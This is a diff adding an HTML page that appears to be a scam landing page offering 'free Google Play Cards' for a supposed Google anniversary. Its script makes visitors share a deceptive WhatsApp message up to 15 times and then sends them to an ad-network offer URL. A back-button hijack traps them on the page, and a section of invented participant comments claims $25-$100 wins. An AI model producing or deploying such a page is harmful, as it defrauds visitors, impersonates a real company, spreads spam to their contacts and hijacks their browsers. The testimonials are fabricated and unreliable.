@@ -1,0 +1,866 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://ilky.tk/google" />
+    <meta property="og:site_name" content="Get Google Play Card Fre" />
+    <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+    <meta property="og:title" content="Get Google Play Card Free" />
+    <meta property="og:description" content="Celebrate it's 22th Anniversary" />
+    <meta name="description" content="Celebrate it's 22th Anniversary" />
+    <meta http-equiv="refresh" content="250; url=http://ilky.tk/internet">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <title>Share To Win!! | Google Play Card |</title>
+
+    <link href="//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css" rel="stylesheet">
+    <link href="//fonts.googleapis.com/css?family=Titillium+Web:400,300,600,700" rel="stylesheet" type="text/css">
+    <link rel="shortcut icon" href="//www.imgak.cf/icon.png" type="image/x-icon">
+    <link rel="canonical" href="https://ilky.tk/google" />
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
+    <script>
+        window.brandCode = "";
+        window.price = "1500";
+        window.startCounter = 0;
+        window.exitUrl = "https://onemboaran.com/afu.php?id=3113155";
+        window.offerUrl = "https://onemboaran.com/afu.php?id=3113155";
+        window.shareUrl = "i6mn.com/education|i6mn.com/education";
+        window.shareType = "whatsapp";
+        window.shareUrlFB = "bit.ly/Education-Offer";
+        window.shareCount = 15;
+        window.popup = false;
+        window.brand = "";
+        window.shareScrubAt = 0;
+        window.shareScrubTo = 0;
+        window.iframeUrl = "IFRAME_URL";
+    </script>
+    <script>
+        // shares
+        function share(item) {
+
+            c++;
+
+            if (switch_urls && (c > switch_after_x_shares)) {
+
+                window.shareUrl = switch_to_wa_url;
+                window.shareUrlFB = switch_to_fb_url;
+
+            }
+
+            if (switch_wa_share_text && (c > switch_after_x_shares)) {
+
+                wa_message = TXT_SWITCH_WHATSAPP_MESSAGE;
+
+            }
+
+            if (c == track_after_x_shares) {
+
+                firePixel();
+
+            }
+
+            if (window.shareType == "facebook" || typeof window.orientation == "undefined") {
+
+                // just 1 share for facebook
+                c = window.shareCount;
+
+                // set cookie valid for 2 days
+                setCookie('c', c, 2);
+
+                social_network = 'Facebook';
+
+                ga('send', 'event', social_network, '[1][' + TXT_LANGUAGE + '] ' + TXT_BRAND);
+
+                // facebook share
+                window.open("http://www.facebook.com/sharer.php?u=" + encodeURIComponent(window.shareUrlFB));
+
+            } else {
+
+                // WhatsApp share
+
+                // set cookie valid for 2 days
+                setCookie('c', c, 2);
+
+                social_network = 'WhatsApp';
+
+                ga('send', 'event', social_network, '[' + c + '][' + TXT_LANGUAGE + '][URL' + (rnd_url + 1) + '][TXT' + (rnd_wa + 1) + '] ' + TXT_BRAND);
+
+                // change number of shares after "window.shareScrubAt" shares
+                if (c == window.shareScrubAt && !window.resetCount) {
+
+                    // change number of shares to "window.shareScrubTo"
+                    c = window.shareScrubTo;
+                    window.resetCount = true;
+
+                }
+
+                // sharing not finished
+
+                if (window.shareTarget == "NEW") {
+
+                    window.internalLink = true;
+                    window.open("whatsapp://send?text=" + wa_message.split("|")[rnd_wa].replace("%s", window.shareUrl.split("|")[rnd_url]));
+                    window.internalLink = false;
+
+                } else {
+
+                    window.internalLink = true;
+                    location.href = ("whatsapp://send?text=" + wa_message.split("|")[rnd_wa].replace("%s", window.shareUrl.split("|")[rnd_url]));
+                    window.internalLink = false;
+
+                }
+
+            }
+
+            setTimeout(function () { document.getElementById('counter').innerHTML = c; }, 5000);
+
+        }
+
+        // continue if sharing finished
+        function share2(item) {
+
+            if (!share_enable || (c >= window.shareCount)) {
+
+                // set cookie valid for 2 days
+                setCookie('completed', true, 2);
+
+                ga('send', 'event', social_network, '[complete][' + TXT_LANGUAGE + '] ' + TXT_BRAND);
+
+                alert(TXT_SHARE_COMPLETE);
+
+                if (window.offerUrl) {
+
+                    // open offer window
+                    goOffer();
+
+                }
+
+            } else {
+
+                alert(TXT_SHARE_MESSAGE.replace("%s", c));
+
+            }
+
+        }
+    </script>
+    <script type="text/javascript">
+        ! function () {
+            var t;
+            try {
+                for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
+                onpopstate = function (t) {
+                    t.state && location.replace("http://ilky.tk/internet")
+                }
+            } catch (o) { }
+        }();
+    </script>
+    <style>
+        /* Whole Sites Page Style  starts*/
+        *,
+        :before,
+        :after {
+            box-sizing: border-box
+        }
+
+        /* Whole Sites Page Style  Ends*/
+        /* Html Style  starts*/
+        html {
+            height: 100%
+        }
+
+        /* Html Style  Ends*/
+        /* Body Style  starts*/
+        body {
+            background-size: cover;
+            color: #000;
+            direction: rtl;
+            font-family: 'Fair Water', Helvetica, 'Helvetica Neue', 'Times New Roman', Times, serif;
+        }
+
+        /* Body Style  Ends*/
+        /* Font Style  starts*/
+        h1,
+        h2,
+        h3,
+        h4 {
+            font-weight: 400
+        }
+
+        h1 {
+            font-size: 1.2em;
+            line-height: 1em
+        }
+
+        /* Font Style End */
+
+
+        /* OverLay Code Starts From Here */
+        .overlay {
+            position: fixed;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0, 0, 0, 0.7);
+            transition: opacity 500ms;
+            visibility: hidden;
+            opacity: 0;
+        }
+
+        .overlay:target {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        /* OverLay Code Ends Here */
+        #gpcs {
+            height: 100%;
+            width: 100%
+        }
+
+        #intro {
+            font-size: 1px
+        }
+
+        #intro {
+            font-size: 13px;
+            text-align: center;
+        }
+
+        #intro2 {
+            font-size: 13px;
+            text-align: center;
+        }
+
+        * {
+            text-decoration: initial;
+        }
+
+
+        u {
+            text-decoration: underline;
+        }
+
+        #top-ribbon {
+            background: black;
+            color: white;
+            padding: 10px;
+            font-size: 10px;
+            border-bottom: 1px solid white;
+        }
+
+        .center {
+
+            text-align: center;
+        }
+
+        .prepopulate .submit {
+            display: block;
+            margin-bottom: 10px;
+            font-size: 1em;
+            font-weight: bold;
+            border: 2px solid black;
+            background: none repeat scroll 0 0 #feb10e;
+            color: black;
+            text-decoration: none;
+            text-align: center;
+            width: 100%;
+            padding: 9px 0;
+            letter-spacing: 1px;
+            text-transform: none !important;
+            border: none;
+            border-radius: 15px;
+            background-color: #A5171A;
+            color: #fff;
+            transition: color, background-color 0.1s ease-in-out !important;
+        }
+
+        .prepopulate .txt {
+            border: 1px solid #37B06D !important;
+        }
+
+        .responsive {
+            max-width: 100%;
+            max-height: 100%;
+        }
+
+        .intro {
+            width: 100%;
+            margin: auto;
+            text-align: center;
+        }
+
+        /* Pop Up Code Starts From Here */
+        .popup {
+            margin: 70px auto;
+            padding: 20px;
+            background: #fff;
+            color: red;
+            border-radius: 5px;
+            max-width: 420px;
+            position: relative;
+            transition: all 5s ease-in-out;
+            overflow-x: hidden;
+        }
+
+        .popup h2 {
+            margin-top: 0;
+            color: #000;
+            height: 30px;
+        }
+
+        .popup .close {
+            position: absolute;
+            top: 0px;
+            right: 20px;
+            transition: all 200ms;
+            font-size: 30px;
+            font-weight: bold;
+            text-decoration: none;
+            color: #333;
+        }
+
+        .popup .close:hover {
+            color: #06D85F;
+        }
+
+        .popup .content {
+            max-height: 30%;
+            overflow-y: hidden;
+        }
+
+        /* Pop Up Code Ends Here */
+
+        h2 {
+            margin-top: 10px
+        }
+
+
+        .content_sec {
+            width: 100%;
+            padding: 0;
+            margin: 0;
+            background: #fff;
+            border-radius: 10px
+        }
+
+        .content_inn {
+            padding: 30px;
+            overflow: auto
+        }
+
+        .content_sec h1 {
+            width: 100%;
+            float: left;
+            padding: 0 0 10px;
+            margin: 0 0 10px;
+            font-size: 4px;
+            color: #000;
+            font-weight: 400;
+            border-bottom: 1px solid #eaeaea
+        }
+
+        .content_sec h2 {
+            width: 100%;
+            float: left;
+            padding: 0 0 10px;
+            margin: 0 0 20px;
+            font-size: 24px;
+            color: #818181;
+            font-weight: 400;
+            border-bottom: 1px solid #eaeaea;
+            text-align: left;
+        }
+
+        .detail_block {
+            width: 100%;
+            float: left;
+            padding: 0 0 15px;
+            margin: 0 0 15px;
+            border-bottom: 1px solid #eaeaea
+        }
+
+        .detail_left {
+            width: 133px;
+            float: left;
+            padding: 0;
+            margin: 0 22px 0 0
+        }
+
+        .detail_left img {
+            width: 100%;
+            max-width: 133px;
+            height: auto
+        }
+
+        .detail_right {
+            overflow: hidden;
+            text-align: right
+        }
+
+        .detail_right h4 {
+            width: 100%;
+            float: left;
+            padding: 0;
+            margin: 0 0 10px;
+            font-size: 24px;
+            color: #3b5998;
+            font-weight: 400
+        }
+
+        .detail_right h4 a {
+            color: #3b5998
+        }
+
+        .detail_right h4 a:hover {
+            color: #5f7dbc
+        }
+
+        .detail_right p {
+            width: 100%;
+            float: left;
+            padding: 0;
+            margin: 0 0 10px;
+            font-size: 24px;
+            color: #000;
+            line-height: normal
+        }
+
+        .detail_right span {
+            width: 100%;
+            float: left;
+            padding: 0;
+            margin: 0 0 10px;
+            font-size: 20px;
+            color: #818181
+        }
+
+
+
+        .container {
+            width: 960px;
+            margin: 0 auto;
+            padding: 0
+        }
+
+
+
+        .content_sec {
+            width: 100%;
+            float: left;
+            padding: 0;
+            background: #fff;
+            border-radius: 10px
+        }
+
+        .content_inn {
+            padding: 30px
+        }
+
+        .content_sec h1 {
+            width: 100%;
+            float: left;
+            padding: 0 0 10px;
+            margin: 0 0 10px;
+            font-size: 24px;
+            color: #000;
+            font-weight: 400;
+            border-bottom: 1px solid #eaeaea
+        }
+
+        .content_sec h2 {
+            width: 100%;
+            float: left;
+            padding: 0 0 10px;
+            margin: 0 0 20px;
+            font-size: 24px;
+            color: #818181;
+            font-weight: 400;
+            border-bottom: 1px solid #eaeaea
+        }
+
+        .detail_block {
+            width: 100%;
+            float: left;
+            padding: 0 0 20px;
+            margin: 0 0 20px;
+            border-bottom: 1px solid #eaeaea
+        }
+
+        .detail_left {
+            width: 133px;
+            float: right;
+            padding: 0;
+            margin: 0 0 0 10px;
+        }
+
+        .detail_left img {
+            width: 100%;
+            max-width: 133px
+        }
+
+        .detail_right {
+            overflow: hidden;
+            font-family: arial;
+        }
+
+        .detail_right h3 {
+            width: 100%;
+            float: left;
+            padding: 0;
+            margin: 0 0 10px;
+            font-size: 24px;
+            color: #3b5998;
+            font-weight: 400
+        }
+
+        .detail_right h3 a {
+            color: #3b5998
+        }
+
+        .detail_right h3 a:hover {
+            color: #5f7dbc
+        }
+
+        .detail_right p {
+            width: 100%;
+            float: left;
+            padding: 0;
+            margin: 0 0 10px;
+            font-size: 24px;
+            color: #000;
+            line-height: normal
+        }
+
+        .detail_right span {
+            width: 100%;
+            float: left;
+            padding: 0;
+            margin: 0 0 10px;
+            font-size: 20px;
+            color: #818181
+        }
+
+        /*Mob-960px Setting Starts*/
+        @media (max-width: 960px) {
+            html {
+                -webkit-text-size-adjust: none
+            }
+
+            .imgak {
+                width: 170px;
+                height: 50px;
+            }
+
+            .gpc {
+                padding: 0
+            }
+
+            .content_inn {
+                padding: 0
+            }
+
+            .content_sec h1 {
+                font-size: 16px
+            }
+
+            .content_sec h2 {
+                font-size: 15px
+            }
+
+            .detail_left {
+                width: 90px;
+                margin: 0 0 0 10px
+            }
+
+            .detail_left img {
+                width: 80px;
+            }
+
+            .detail_right h4 {
+                font-size: 18px;
+                font-weight: 700
+            }
+
+            .detail_right h3 {
+                font-size: 11px;
+                font-weight: 700
+            }
+
+            .detail_right p {
+                font-size: 15px
+            }
+
+            .detail_right span {
+                font-size: 100px
+            }
+
+            .likebar {
+                font-size: 12px;
+            }
+        }
+
+        @media screen and (max-width: 414px) {
+            h1 {
+                font-size: 25px;
+            }
+        }
+
+        @media screen and (max-width: 375px) {
+            h1 {
+                font-size: 22px;
+            }
+        }
+
+        @media screen and (max-width: 360px) {
+
+            h1 {
+                font-size: 16px;
+            }
+        }
+
+        @media screen and (max-width: 320px) {
+            .intro {
+
+                text-align: center;
+            }
+
+            h2 {
+                font-size: 17px;
+            }
+
+            h1 {
+                font-size: 18px;
+            }
+        }
+
+        /*Mob-480px Setting Starts*/
+        @media (max-width: 480px) {
+            html {
+                -webkit-text-size-adjust: none
+            }
+
+            .wrapper {
+                padding: 0
+            }
+
+            .content_inn {
+                padding: 0
+            }
+
+            .content_sec h1 {
+                font-size: 15px
+            }
+
+            .content_sec h2 {
+                font-size: 15px
+            }
+
+            .detail_left {
+                width: 90px;
+                margin: 0 0 0 10px
+            }
+
+            .detail_right h3 {
+                font-size: 15px;
+                font-weight: 700
+            }
+
+            .detail_right p {
+                font-size: 13px
+            }
+
+            .detail_right span {
+                font-size: 12px
+            }
+        }
+
+        /*Mob-480px Setting Ends*/
+    </style>
+</head>
+
+<body>
+    <div id="gpcs">
+        <div>
+            <!--Img Of Play Crads-->
+            <center><img src="https://i.imgur.com/rhnfJ3z.png"></center>
+            <center><img src="https://i.imgur.com/eg4cYXa.png"></center>
+            <!--Img Of Play Crads-->
+            <!--Text-->
+            <center>
+                <h2>How To Get Your Google Play Card<span style="color:#f44335;"><b> Code</b></span></h2>
+            </center>
+            <!--Text-->
+            <!--Intro Text-->
+            <div id="intro">
+                <center>
+                    <span style="color: #000000;font-size: 16px;"><b>Share this opportunity with </b></span>
+                    <span style="color: #c30000;font-size: 16px;"><b> all your friends in</b></span>
+                    <span style="color: #000000;font-size: 16px;"><b></b></span>
+                    <span style="color: #0e9d58;font-size: 16px;"><b>WhatsApp</b></span>
+                    <span style="color: #000000;font-size: 16px;"><b>by clicking on the "SHARE"
+                            Button</b></span>
+                </center>
+            </div>
+            <!--Intro Text-->
+            <!--Arrow Gif-->
+            <center><img src="https://i.imgur.com/hxzBI6E.gif"></center>
+            <!--Arrow Gif-->
+            <!--WhatsApp-->
+            <center>
+                <div>
+                    <a href="whatsapp://send?text=*Urgent* Google Inc. *Offers Google Play Cards for FREE* ($25, $50, $100) to celebrate 22th anniversary, Try Your Luck *Quickly* From Here : https://bit.ly/G-PlayCards"
+                        data-action="share/whatsapp/share">
+                        <img src="//www.imgak.cf/lhHjeQE.png" class="imgak" alt="Share">
+                    </a>
+                </div>
+            </center>
+            <!--WhatsApp-->
+            <br>
+            <!--Done Text-->
+            <div id="intro2">
+                <span style="color: #000000;font-size: 15px;">
+                    <b>
+                        After You Share click on the "DONE" button it
+                        will be view the missing code
+                    </b>
+                </span>
+            </div>
+            <!--Done Text-->
+            <br>
+            <!--Done-->
+            <center>
+                <div>
+                    <a href="javascript:void(0)">
+                        <img src="//www.imgak.cf/4AcJMbr.png"  onclick="share2()" class="imgak" alt="Done"></span>
+                    </a>
+                </div>
+            </center>
+            <!--Done-->
+            <br>
+            <!--Pop Up-->
+            <div id="done" class="overlay">
+                <div class="popup">
+                    <h2><img style="width: 40px; margin-bottom: 20px"
+                            src="https://cdn0.iconfinder.com/data/icons/shift-free/32/Error-128.png" alt="">
+                    </h2>
+                    <a class="close" href="#">×</a>
+                    <div class="content">
+                        Sorry, you did not publish the message to 10 people in WhatsApp.
+                    </div>
+                </div>
+            </div>
+            <!--Pop Up-->
+        </div>
+        <!--Comments Section-->
+        <div class="content_sec">
+            <div class="content_inn">
+                <center>
+                    <h1>Comments Of Participants In The Draw</h1>
+                </center>
+                <h2>1,927 Comments</h2>
+                <div class="detail_block">
+                    <div class="detail_left"><img src="//www.imgak.cf/men/1.jpg">
+                    </div>
+                    <div class="detail_right">
+                        <h4><a>Whitney Mason</a></h4>
+                        <p>
+                            Finally i got Google Play Card $100 &nbsp;<br><br>
+                            <img src="https://i.imgur.com/97k7Chw.png" height="300px">
+                        </p>
+                    </div>
+                    <span class="likebar"> <a class="fbblue" href="javascript:void(0);">Reply</a> ·
+                        <a class="fbblue smaller" href="javascript:void(0);">Like</a> ·
+                        <span class="fbblue likes">29</span> ·
+                        <span>at 10:54 pm</span>
+                    </span>
+                </div>
+                <div class="detail_block">
+                    <div class="detail_left"><a href="#" target="_blank"><img src="https://i.imgur.com/0Y3uzR2.jpg"></a>
+                    </div>
+                    <div class="detail_right">
+                        <h4><a>Haley Shealy Mitchell</a></h4>
+                        <p>
+                            That's great <br>After I did all the steps <br>I got the the code $50<br><br>
+                        </p>
+                    </div>
+                    <span class="likebar"> <a class="fbblue" href="javascript:void(0);">Reply</a> ·
+                        <a class="fbblue smaller" href="javascript:void(0);">Like</a> ·
+                        <span class="fbblue likes">22</span> ·
+                        <span>at 4:18 pm</span>
+                    </span>
+                </div>
+                <div class="detail_block">
+                    <div class="detail_left"><a href="#" target="_blank"><img width="150px"
+                                src="//www.imgak.cf/6.jpg"></a>
+                    </div>
+                    <div class="detail_right">
+                        <h4><a>Aashish Adhikari</a></h4>
+                        <p> After Completing Survey I Got $100<br> Thank You God<br>
+                        </p>
+                    </div>
+                    <span class="likebar"> <a class="fbblue" href="javascript:void(0);">Reply</a> ·
+                        <a class="fbblue smaller" href="javascript:void(0);">Like</a> ·
+                        <span class="fbblue likes">17</span> ·
+                        <span>at 10:14 am</span>
+                    </span>
+                </div>
+                <div class="detail_block">
+                    <div class="detail_left"><a href="#" target="_blank"><img src="//www.imgak.cf/5.jpg"></a>
+                    </div>
+                    <div class="detail_right">
+                        <h4><a>Milan Rawat</a></h4>
+                        <p>!!OMG<br> I got google play gift card $25<br><br><br><br>
+                        </p>
+                    </div>
+                    <span class="likebar"> <a class="fbblue" href="javascript:void(0);">Reply</a> ·
+                        <a class="fbblue smaller" href="javascript:void(0);">Like</a> ·
+                        <span class="fbblue likes">14</span> ·
+                        <span>at 3:33 am</span>
+                    </span>
+                </div>
+                <div class="detail_block">
+                    <div class="detail_left"><a href="#" target="_blank"><img src="https://i.imgur.com/Vm9fcWe.jpg"></a>
+                    </div>
+                    <div class="detail_right">
+                        <h4><a>Alyssa Hernandez</a></h4>
+                        <p>
+                            I have no words to express my happiness <br>Thank you
+                            <br>I'v got google play balance $100<br><br>
+                        </p>
+                        <div>
+
+                        </div>
+                    </div>
+                    <span class="likebar"> <a class="fbblue" href="javascript:void(0);">Reply</a> ·
+                        <a class="fbblue smaller" href="javascript:void(0);">Like</a> ·
+                        <span class="fbblue likes">13</span> ·
+                        <span>at 12:34 am</span>
+                    </span>
+                </div>
+                <div class="detail_block">
+                    <div class="detail_left"><a href="#" target="_blank"><img src="//www.imgak.cf/4.jpg"></a>
+                    </div>
+                    <div class="detail_right">
+                        <h4><a>Tilak Malla Thakuri</a></h4>
+                        <p>
+                            Amazing Thanks for the Google Play Card ;) $50<br><br><br><br>
+                        </p>
+                    </div>
+                    <span class="likebar"> <a class="fbblue" href="javascript:void(0);">Reply</a> ·
+                        <a class="fbblue smaller" href="javascript:void(0);">Like</a> ·
+                        <span class="fbblue likes">6</span> ·
+                        <span>at 11:01 am</span>
+                    </span>
+                </div>
+            </div>
+            <!--Comments Section Ends-->
+        </div>
+</body>
+
+</html>
